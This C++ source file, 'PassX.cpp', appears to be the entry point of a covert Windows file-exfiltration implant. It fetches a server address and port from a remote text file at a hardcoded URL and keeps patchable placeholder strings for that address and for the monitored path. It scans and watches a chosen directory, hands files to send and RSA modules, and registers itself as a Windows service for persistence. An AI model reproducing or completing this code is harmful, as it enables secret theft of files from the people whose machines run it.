// PassX.cpp : Defines the entry point for the application.
//
#include "PassX.h"
#include "WatchDirectory.h"
#include "EnumDirectoryFile.h"
#include "WinHttp.h"
#include "ServerUrl.h"
#include "Utils.h"
#include "SendThread.h"
#include "rsa.h"
#include "Service.h"

#ifdef _DEBUG
WCHAR g_wMonitorPath[MAX_PATH];
char g_szHttpServerAddress[MAX_PATH] = "http://www.bioskit.com/Url.txt";
//char g_FixedMonitorPath[MAX_PATH] = "FixedMonitorPathFixedMonitorPathFixedMonitorPathFixedMonitorPathFixedMonitorPathFixedMonitorPathFixedMonitorPathFixedMonitorPathFixedMonitorPath";
char g_FixedMonitorPath[MAX_PATH] = "C:\\Monitor\\";
CHAR g_FixedIpAddress[MAX_PATH];
char g_ServerPort[MAX_PATH];
#else
WCHAR g_wMonitorPath[MAX_PATH] = {0};
char g_ServerPort[MAX_PATH];
char g_szHttpServerAddress[MAX_PATH] = "HttpServerAddressHttpServerAddressHttpServerAddressHttpServerAddressHttpServerAddressHttpServerAddressHttpServerAddressHttpServerAddressHttpServerAddress";
char g_FixedMonitorPath[MAX_PATH] = "FixedMonitorPathFixedMonitorPathFixedMonitorPathFixedMonitorPathFixedMonitorPathFixedMonitorPathFixedMonitorPathFixedMonitorPathFixedMonitorPath";
//char g_FixedMonitorPath[MAX_PATH] = "C:\\Monitor\\";
//char g_szHttpServerAddress[MAX_PATH] = "http://www.bioskit.com/Url.txt";
CHAR g_FixedIpAddress[MAX_PATH];
#endif


void InitializeGlobalDat()
{
	ULONG ulServerIpLen = 0;
	char *szTmp = NULL;
	char *szTmp1 = NULL;
//#ifdef _DEBUG
//	g_StrServerURL = (WCHAR *)LocalAlloc(LPTR,sizeof(WCHAR) * MAX_PATH);
//	if (g_StrServerURL)
//	{
//		GetSyncIp(g_StrServerURL);
//		g_ServerIp = UnicodeToANSI(g_StrServerURL);
//		if (g_ServerIp)
//		{
//			ulServerIpLen = strlen(g_ServerIp);
//			for (int i = 0;i < ulServerIpLen;i++)
//			{
//				if (g_ServerIp[i] == '+')
//				{
//					g_ServerIp[i] = '\0';
//				}
//			}
//		}
//	}
//#else
	RtlZeroMemory(g_ServerPort,MAX_PATH);
	szTmp = HttpGetFile(g_szHttpServerAddress);
	szTmp1 = strstr(szTmp,":");
	if (szTmp1)
	{
		RtlCopyMemory(g_ServerPort,(char*)((ULONG)szTmp1 + 1),strlen((char*)((ULONG)szTmp1 + 1)));
		szTmp1[0] = '\0';
	}
	if (szTmp)
	{
		RtlZeroMemory(g_FixedIpAddress,MAX_PATH);
		RtlCopyMemory(g_FixedIpAddress,szTmp,strlen(szTmp));
	}
	g_ServerIp = (char*)g_FixedIpAddress;
	RtlZeroMemory(g_wMonitorPath,sizeof(WCHAR) * MAX_PATH);
	MultiByteToWideChar(CP_ACP,0,g_FixedMonitorPath,strlen(g_FixedMonitorPath),g_wMonitorPath,MAX_PATH);
//#endif

	
}
int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);
#define _DEBUG_TEST	1
#ifdef _DEBUG_TEST
	WCHAR wCachePath[MAX_PATH];
	HANDLE hSendCache,hFindFileThread,hMonitorDir;

	InitializeGlobalDat();
	InitializeList();

	RtlZeroMemory(wCachePath,sizeof(WCHAR) * MAX_PATH);
	GetCurrentDirectory(MAX_PATH,wCachePath);
	StringCchCatW(wCachePath,MAX_PATH,L"\\Cache");
	hSendCache = CreateThread(NULL,0,DoFindAllFile,wCachePath,NULL,0);
	if (NULL == hSendCache)
	{
		ExitProcess(GetLastError());
	}
	WaitForSingleObject(hSendCache,INFINITE);
	hFindFileThread = CreateThread(NULL,0,DoFindAllFile,g_wMonitorPath,NULL,0);
	if (NULL == hFindFileThread)
	{
		ExitProcess(GetLastError());
	}
	WaitForSingleObject(hFindFileThread,INFINITE);
	hMonitorDir = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)MonitorDir,NULL,NULL,NULL);
	if (!hMonitorDir)
	{
		ExitProcess(GetLastError());
	}
	WaitForSingleObject(hMonitorDir,INFINITE);
#else
	WCHAR wCurModulePath[MAX_PATH];
	Init();
	g_ulThreadID = ::GetCurrentThreadId();
	SERVICE_TABLE_ENTRY st[] =
	{
		{SERVICE_NAME,(LPSERVICE_MAIN_FUNCTION)ServiceMain},
		{NULL,NULL}
	};

	if (wcsicmp(lpCmdLine,L"/install") == 0)
	{
		if (IsInstalled(SERVICE_NAME))
		{
			Uninstall(SERVICE_NAME);
		}
		RtlZeroMemory(wCurModulePath,sizeof(WCHAR) * MAX_PATH);
		GetModuleFileName(NULL,wCurModulePath,MAX_PATH);
		Install(SERVICE_NAME,SERVICE_SHOW_NAME,wCurModulePath,SERVICE_DEPENDENCIES);
	}
	else if (wcsicmp(lpCmdLine,L"/uninstall") == 0)
	{
		Uninstall(SERVICE_NAME);
	}
	else
	{
		if (!::StartServiceCtrlDispatcher(st))
		{
			OutputDebugString(L"Register Service Main Function Error!");
		}
	}
#endif
	return 0;
}